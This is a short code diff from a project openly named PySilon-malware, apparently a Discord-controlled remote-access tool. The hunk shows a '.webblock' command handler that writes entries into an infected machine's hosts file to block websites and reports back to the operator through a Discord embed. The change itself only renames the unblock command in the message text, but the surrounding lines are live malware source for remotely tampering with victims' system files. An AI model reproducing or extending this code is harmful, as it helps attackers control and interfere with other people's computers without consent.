@@ -29,7 +29,7 @@ elif message.content[:9] == '.webblock':
         if hosts_file_path:
             with open(hosts_file_path, 'a') as hosts_file:
                 hosts_file.write(host_entry)
-            embed = discord.Embed(title=f"🟢 Success", description=f'```Website {website} has been blocked. Unblock it by using .unblock-website [websitename]```', colour=discord.Colour.green())
+            embed = discord.Embed(title=f"🟢 Success", description=f'```Website {website} has been blocked. Unblock it by using .webunblock [websitename]```', colour=discord.Colour.green())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             await message.channel.send(embed=embed)
 
